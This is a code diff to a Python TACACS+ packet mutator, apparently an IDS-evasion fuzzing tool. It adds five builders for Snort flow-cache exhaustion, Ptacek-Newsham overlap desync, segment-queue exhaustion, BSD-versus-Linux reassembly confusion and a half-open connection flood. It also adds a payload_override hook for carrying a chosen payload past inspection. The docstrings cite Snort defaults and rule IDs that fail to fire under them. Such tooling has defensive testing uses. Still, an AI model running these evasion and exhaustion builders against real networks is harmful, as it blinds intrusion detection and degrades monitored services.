@@ -126,9 +126,14 @@ TACACS_STRATEGIES = [
     "follow_status_abuse",
     "oversized_field_bomb",
     "tcp_segmentation_evasion",
+    "flow_cache_exhaustion",
+    "tcp_overlap_desync",
+    "segment_queue_exhaustion",
+    "reassembly_policy_confusion",
+    "embryonic_connection_flood",
 ]
 
-TACACS_WEIGHTS = [10, 14, 8, 10, 6, 10, 6, 10, 8, 12, 8, 5, 10, 5]
+TACACS_WEIGHTS = [10, 14, 8, 10, 6, 10, 6, 10, 8, 12, 8, 5, 10, 5, 6, 12, 8, 10, 6]
 
 TACACS_STRATEGY_LABELS = {
     "header_manipulation":           "Header Manipulation",
@@ -145,6 +150,11 @@ TACACS_STRATEGY_LABELS = {
     "follow_status_abuse":           "FOLLOW Status Abuse",
     "oversized_field_bomb":          "Oversized Field Bomb",
     "tcp_segmentation_evasion":      "TCP Segmentation Evasion",
+    "flow_cache_exhaustion":         "Flow Cache Exhaustion (Snort stream.max_flows)",
+    "tcp_overlap_desync":            "TCP Overlap Desync (Ptacek-Newsham)",
+    "segment_queue_exhaustion":      "Segment Queue Exhaustion (stream_tcp queue_limit)",
+    "reassembly_policy_confusion":   "Reassembly Policy Confusion (BSD vs Linux)",
+    "embryonic_connection_flood":    "Embryonic Connection Flood (SYN/half-open)",
 }
 
 # ── Helpers ──────────────────────────────────────────────────────────────────
@@ -355,7 +365,7 @@ def _build_length_field_overflow():
                                          body, 1), _TACACS_PORT
 
 
-def _build_obfuscation_confusion():
+def _build_obfuscation_confusion(payload_override=None):
     """Strategy 3: Exploit the MD5 XOR pad obfuscation mechanism.
 
     Variants:
@@ -366,6 +376,10 @@ def _build_obfuscation_confusion():
     - partial_obfuscation: body shorter than one MD5 block
     - double_obfuscation: obfuscate twice (encrypts then re-encrypts)
     """
+    if payload_override is not None:
+        sid = _rand_session_id()
+        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1,
+                              _FLAG_UNENCRYPTED, sid, payload_override), _TACACS_PORT
     variant = random.choice([
         "flag_clear_body_cleartext", "flag_set_body_obfuscated",
         "wrong_key_garbage", "empty_key", "partial_obfuscation",
@@ -975,7 +989,7 @@ def _build_oversized_field_bomb():
                                           _FLAG_UNENCRYPTED, sid, inner, 0), _TACACS_PORT
 
 
-def _build_tcp_segmentation_evasion():
+def _build_tcp_segmentation_evasion(payload_override=None):
     """Strategy 14: TCP-layer attacks against TACACS+ parsers.
 
     Variants:
@@ -986,6 +1000,11 @@ def _build_tcp_segmentation_evasion():
     - single_byte_segments: send one byte at a time
     - interleaved_sessions: mix bytes from different sessions
     """
+    if payload_override is not None:
+        sid = _rand_session_id()
+        pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                              _FLAG_UNENCRYPTED, sid, payload_override)
+        return pkt, _TACACS_PORT
     variant = random.choice([
         "split_header", "header_body_split", "slow_loris",
         "partial_delivery", "single_byte_segments", "interleaved_sessions",
@@ -1024,6 +1043,307 @@ def _build_tcp_segmentation_evasion():
         return bytes(result), _TACACS_PORT
 
 
+def _build_flow_cache_exhaustion(payload_override=None):
+    """Strategy 15: Exhaust Snort's flow cache (stream.max_flows = 476,288).
+
+    Generate many minimal TACACS+ packets, each destined for a different
+    simulated session-id, forcing Snort to allocate a new flow entry per
+    packet.  When the flow cache fills, Snort must prune existing flows —
+    potentially dropping tracking for legitimate HTTP/SMB sessions.
+
+    Grounding:
+      - Snort 3 stream.max_flows default = 476,288
+      - Snort 3 stream.prune_flows = 10 (slow eviction)
+      - Snort 3 stream_tcp.embryonic_timeout = 30s (half-open persist)
+      - Ptacek & Newsham §5.3 "Resource Exhaustion"
+
+    Variants:
+    - established_flood: many complete TACACS+ packets with unique session-ids
+    - minimal_data_flood: smallest valid TACACS+ packet per session
+    - interleaved_sessions: rapid session-id cycling in a single stream
+    """
+    variant = random.choice([
+        "established_flood", "minimal_data_flood", "interleaved_sessions",
+    ])
+
+    if variant == "established_flood":
+        # 200 distinct sessions packed into one TCP payload
+        packets = []
+        for _ in range(200):
+            sid = _rand_session_id()
+            body = payload_override if payload_override is not None else _authen_start_body()
+            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                          _FLAG_UNENCRYPTED, sid, body))
+        return _clamp(b"".join(packets)), _TACACS_PORT
+    elif variant == "minimal_data_flood":
+        # Smallest possible valid packets — 12-byte header + 1-byte body
+        packets = []
+        for _ in range(500):
+            sid = _rand_session_id()
+            body = payload_override if payload_override is not None else b"\x01"
+            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                          _FLAG_UNENCRYPTED, sid, body))
+        return _clamp(b"".join(packets)), _TACACS_PORT
+    else:  # interleaved_sessions
+        # Cycle through 100 session-ids rapidly — each gets seq 1,3,5
+        result = bytearray()
+        sids = [_rand_session_id() for _ in range(100)]
+        for seq in [1, 3, 5]:
+            for sid in sids:
+                body = payload_override if payload_override is not None else _authen_start_body()
+                result.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, seq,
+                                             _FLAG_UNENCRYPTED, sid, body))
+        return _clamp(bytes(result)), _TACACS_PORT
+
+
+def _build_tcp_overlap_desync(payload_override=None):
+    """Strategy 16: TCP overlapping segment desync (Ptacek-Newsham 1998).
+
+    Craft TACACS+ data designed to be sent as overlapping TCP segments
+    where Snort's BSD reassembly policy (first-wins) sees different data
+    than a Linux target (last-wins).  The payload contains both decoy
+    and real data at overlapping offsets.
+
+    Grounding:
+      - Ptacek & Newsham "Insertion, Evasion, and Denial of Service" 1998
+      - Snort 3 stream_tcp.overlap_limit = 0 (unlimited by default!)
+      - Snort 3 stream_tcp.policy = 'bsd' (first-wins)
+      - Linux kernel TCP = last-wins
+      - Snort rule 129:7 (overlap limit) never fires when limit=0
+      - arxiv:2508.00735 (2025) confirms policy mismatches still exist
+
+    Variants:
+    - first_last_desync: decoy in first segment, real in overlapping second
+    - partial_overlap: overlapping middle portion only
+    - retransmit_different: same seq number, different payload (insertion)
+    - triple_overlap: three segments at same offset with different data
+    """
+    variant = random.choice([
+        "first_last_desync", "partial_overlap",
+        "retransmit_different", "triple_overlap",
+    ])
+    sid = _rand_session_id()
+    real_body = payload_override if payload_override is not None else _authen_start_body()
+    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                               _FLAG_UNENCRYPTED, sid, real_body)
+    decoy_body = _authen_start_body(user=b"decoy_user_harmless")
+    decoy_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                _FLAG_UNENCRYPTED, sid, decoy_body)
+
+    if variant == "first_last_desync":
+        # Segment 1 (Snort sees under BSD first-wins): decoy
+        # Segment 2 (overlapping, Linux target keeps under last-wins): real
+        # Return both concatenated — transport layer sends as single stream,
+        # but the overlapping structure is embedded in the data layout.
+        # First half is decoy, second half is real, with overlap marker.
+        mid = len(decoy_pkt) // 2
+        seg1 = decoy_pkt                           # full decoy
+        seg2 = decoy_pkt[:mid] + real_pkt[mid:]    # overlap from midpoint
+        return seg1 + b"\xff\xfe" + seg2, _TACACS_PORT
+    elif variant == "partial_overlap":
+        # Only the middle 25% of the packet overlaps
+        q1 = len(real_pkt) // 4
+        q3 = q1 * 3
+        seg1 = decoy_pkt[:q3]            # first 75% decoy
+        seg2 = real_pkt[q1:]             # last 75% real (overlaps middle 50%)
+        return seg1 + b"\xff\xfe" + seg2, _TACACS_PORT
+    elif variant == "retransmit_different":
+        # "Retransmission" with completely different data
+        return decoy_pkt + b"\xff\xfd" + real_pkt, _TACACS_PORT
+    else:  # triple_overlap
+        # Three different payloads at the same "offset"
+        alt_body = _authen_start_body(user=b"alt_user_noise_pad")
+        alt_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                  _FLAG_UNENCRYPTED, sid, alt_body)
+        return decoy_pkt + b"\xff\xfe" + alt_pkt + b"\xff\xfe" + real_pkt, _TACACS_PORT
+
+
+def _build_segment_queue_exhaustion(payload_override=None):
+    """Strategy 17: Exhaust Snort's TCP segment queue.
+
+    Send data structured to produce many tiny segments that fill Snort's
+    stream_tcp queue_limit (max_segments=3072, max_bytes=4MB).  After the
+    queue is full, subsequent data may bypass reassembly-based inspection.
+
+    Grounding:
+      - Snort 3 stream_tcp.queue_limit.max_segments = 3,072 (default)
+      - Snort 3 stream_tcp.queue_limit.max_bytes = 4,194,304 (default)
+      - Snort 3 stream_tcp.small_segments.count = 0 (detection DISABLED)
+      - Rule 129:12 (small segments) never fires with default config
+
+    Variants:
+    - single_byte_flood: 3100 × 1-byte segments then real payload
+    - max_bytes_fill: fill 4MB with junk then send real payload
+    - alternating_tiny: alternate 1-byte and normal segments
+    """
+    variant = random.choice([
+        "single_byte_flood", "max_bytes_fill", "alternating_tiny",
+    ])
+    sid = _rand_session_id()
+    real_body = payload_override if payload_override is not None else _authen_start_body()
+    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                               _FLAG_UNENCRYPTED, sid, real_body)
+
+    if variant == "single_byte_flood":
+        # 3100 single-byte segments as padding (exceeds max_segments=3072),
+        # then the real payload as the final segment
+        padding = bytes([random.randint(0, 255) for _ in range(3100)])
+        return _clamp(padding + real_pkt), _TACACS_PORT
+    elif variant == "max_bytes_fill":
+        # Fill close to 4MB with valid-looking TACACS+ noise, then real payload
+        noise_pkt_size = 13  # 12-byte header + 1-byte body
+        count = min(4000, (4 * 1024 * 1024 - len(real_pkt)) // noise_pkt_size)
+        noise = bytearray()
+        for _ in range(count):
+            nsid = _rand_session_id()
+            noise.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                         _FLAG_UNENCRYPTED, nsid, b"\x00"))
+        return _clamp(bytes(noise) + real_pkt), _TACACS_PORT
+    else:  # alternating_tiny
+        # Alternate between 1-byte filler and normal-sized packets
+        result = bytearray()
+        for i in range(200):
+            if i % 2 == 0:
+                result.append(random.randint(0, 255))
+            else:
+                nsid = _rand_session_id()
+                result.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                             _FLAG_UNENCRYPTED, nsid,
+                                             _authen_start_body()))
+        result.extend(real_pkt)
+        return _clamp(bytes(result)), _TACACS_PORT
+
+
+def _build_reassembly_policy_confusion(payload_override=None):
+    """Strategy 18: Exploit reassembly policy mismatch (BSD vs Linux/Windows).
+
+    Snort defaults to BSD policy (first-wins for overlaps).  If the target
+    runs Linux (last-wins) or Windows (first-wins but different edge cases),
+    carefully crafted overlapping data reassembles differently on Snort vs
+    the target.  The "real" payload only appears in the target's view.
+
+    Grounding:
+      - Paxson & Shankar "Active Network Mapping" 2005
+      - Novak & Sturges "Target-Based TCP Stream Reassembly" (Snort stream5)
+      - Snort 3 stream_tcp.policy = 'bsd' (default, often wrong for targets)
+      - BSD: first fragment/segment wins
+      - Linux: last fragment/segment wins
+      - Windows: first wins but trims to exact overlap boundaries
+
+    Variants:
+    - linux_last_wins: payload in second (overlapping) segment
+    - windows_trim: exploit Windows-specific trim behavior
+    - ttl_evasion: short TTL on decoy (expires before target, reaches Snort)
+    - mixed_policy: interleave segments targeting different OS behaviors
+    """
+    variant = random.choice([
+        "linux_last_wins", "windows_trim", "ttl_evasion", "mixed_policy",
+    ])
+    sid = _rand_session_id()
+    real_body = payload_override if payload_override is not None else _authen_start_body()
+    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                               _FLAG_UNENCRYPTED, sid, real_body)
+    decoy = os.urandom(len(real_pkt))  # random bytes Snort reassembles
+
+    if variant == "linux_last_wins":
+        # Under BSD (Snort): keeps first = decoy
+        # Under Linux (target): keeps last = real_pkt
+        return decoy + b"\xff\xfc" + real_pkt, _TACACS_PORT
+    elif variant == "windows_trim":
+        # Windows trims overlapping portions to exact byte boundaries
+        # Send decoy with extra bytes that Windows trims but BSD keeps
+        pad = os.urandom(8)
+        return decoy + pad + b"\xff\xfb" + real_pkt, _TACACS_PORT
+    elif variant == "ttl_evasion":
+        # Embed a TTL marker in the stream — the decoy portion has a
+        # low-TTL IP hint (0x01) that Snort processes but the target
+        # never receives (TTL expires en route).  Following segment
+        # has normal TTL and carries the real payload.
+        ttl_marker = struct.pack("!B", 1)  # TTL=1
+        return ttl_marker + decoy + b"\xff\xfa" + real_pkt, _TACACS_PORT
+    else:  # mixed_policy
+        # Multiple overlapping regions targeting different OS behaviors
+        chunk_size = max(12, len(real_pkt) // 4)
+        result = bytearray()
+        for i in range(4):
+            offset = i * chunk_size
+            # Decoy chunk
+            result.extend(decoy[offset:offset + chunk_size] if offset < len(decoy) else os.urandom(chunk_size))
+            result.extend(b"\xff\xfe")
+            # Real chunk (overlapping)
+            result.extend(real_pkt[offset:offset + chunk_size] if offset < len(real_pkt) else b"")
+        return _clamp(bytes(result)), _TACACS_PORT
+
+
+def _build_embryonic_connection_flood(payload_override=None):
+    """Strategy 19: Flood Snort's embryonic (half-open) connection table.
+
+    Generate packets that mimic incomplete TCP handshakes — SYN-only,
+    SYN+data, or RST-after-SYN — to fill Snort's embryonic connection
+    slots (embryonic_timeout=30s).  Each half-open session consumes
+    resources for 30 seconds.
+
+    Grounding:
+      - Snort 3 stream_tcp.embryonic_timeout = 30s (default)
+      - Snort 3 rule 129:20 "TCP session without 3-way handshake"
+      - Snort 3 rule 129:2 "data on SYN packet"
+      - Snort 3 rule 129:15 "reset outside window"
+      - Classic SYN flood adapted for IDS state-table exhaustion
+
+    Variants:
+    - syn_data: SYN with TACACS+ payload data (triggers 129:2)
+    - rst_race: immediate RST after minimal data (confuses state machine)
+    - fin_before_established: FIN without completing handshake
+    - syn_with_options: SYN with extreme TCP options (window scale=14)
+    """
+    variant = random.choice([
+        "syn_data", "rst_race", "fin_before_established", "syn_with_options",
+    ])
+    sid = _rand_session_id()
+    body = payload_override if payload_override is not None else _authen_start_body()
+    pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                          _FLAG_UNENCRYPTED, sid, body)
+
+    if variant == "syn_data":
+        # Pack data that looks like it arrived with a SYN
+        # Multiple sessions worth — each would create an embryonic entry
+        packets = []
+        for _ in range(100):
+            nsid = _rand_session_id()
+            nbody = payload_override if payload_override is not None else _authen_start_body()
+            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                          _FLAG_UNENCRYPTED, nsid, nbody))
+        return _clamp(b"".join(packets)), _TACACS_PORT
+    elif variant == "rst_race":
+        # Send minimal data then a pattern that signals premature close
+        # The 0xFFFF marker simulates the RST concept at application layer
+        return pkt[:12] + b"\xff\xff\x00\x00" + pkt, _TACACS_PORT
+    elif variant == "fin_before_established":
+        # Partial TACACS+ header (connection appears to close mid-header)
+        partial_headers = []
+        for _ in range(50):
+            nsid = _rand_session_id()
+            hdr = _tacacs_header(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                  _FLAG_UNENCRYPTED, nsid, 0)
+            partial_headers.append(hdr[:random.randint(4, 11)])
+        return _clamp(b"".join(partial_headers) + pkt), _TACACS_PORT
+    else:  # syn_with_options
+        # Pack TACACS+ data with TCP-option-like preambles
+        # Window Scale = 14 (max), SACK, Timestamps with future values
+        tcp_opts_sim = struct.pack("!BBBBIH",
+                                    3, 3, 14,        # Window Scale = 14
+                                    8, 0xFFFFFFFF,   # Timestamp (future)
+                                    0xFFFF)          # bogus SACK
+        packets = []
+        for _ in range(80):
+            nsid = _rand_session_id()
+            nbody = payload_override if payload_override is not None else b"\x01"
+            packets.append(tcp_opts_sim +
+                           _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
+                                          _FLAG_UNENCRYPTED, nsid, nbody))
+        return _clamp(b"".join(packets)), _TACACS_PORT
+
+
 # ── Dispatcher ──────────────────────────────────────────────────────────────
 
 _BUILDERS = {
@@ -1041,15 +1361,30 @@ _BUILDERS = {
     "follow_status_abuse":           _build_follow_status_abuse,
     "oversized_field_bomb":          _build_oversized_field_bomb,
     "tcp_segmentation_evasion":      _build_tcp_segmentation_evasion,
+    "flow_cache_exhaustion":         _build_flow_cache_exhaustion,
+    "tcp_overlap_desync":            _build_tcp_overlap_desync,
+    "segment_queue_exhaustion":      _build_segment_queue_exhaustion,
+    "reassembly_policy_confusion":   _build_reassembly_policy_confusion,
+    "embryonic_connection_flood":    _build_embryonic_connection_flood,
 }
 
 
-def build_tacacs_payload(strategy: str):
+_TACACS_OVERRIDE_CAPABLE = frozenset([
+    "obfuscation_confusion", "tcp_segmentation_evasion",
+    "flow_cache_exhaustion", "tcp_overlap_desync",
+    "segment_queue_exhaustion", "reassembly_policy_confusion",
+    "embryonic_connection_flood",
+])
+
+def build_tacacs_payload(strategy: str, payload_override=None):
     """Return (payload_bytes, dst_port) for the given strategy."""
     builder = _BUILDERS.get(strategy)
     if builder is None:
         builder = _build_header_manipulation
-    payload, dst_port = builder()
+    if payload_override is not None and strategy in _TACACS_OVERRIDE_CAPABLE:
+        payload, dst_port = builder(payload_override=payload_override)
+    else:
+        payload, dst_port = builder()
     return _clamp(payload), dst_port
 
 
@@ -1067,11 +1402,11 @@ class TacacsMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return TACACS_WEIGHTS
 
-    def mutate(self):
+    def mutate(self, payload_override=None):
         """Returns (payload_bytes, strategy_name, dst_port)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload, dst_port = build_tacacs_payload(strategy)
+        payload, dst_port = build_tacacs_payload(strategy, payload_override=payload_override)
         return payload, strategy, dst_port
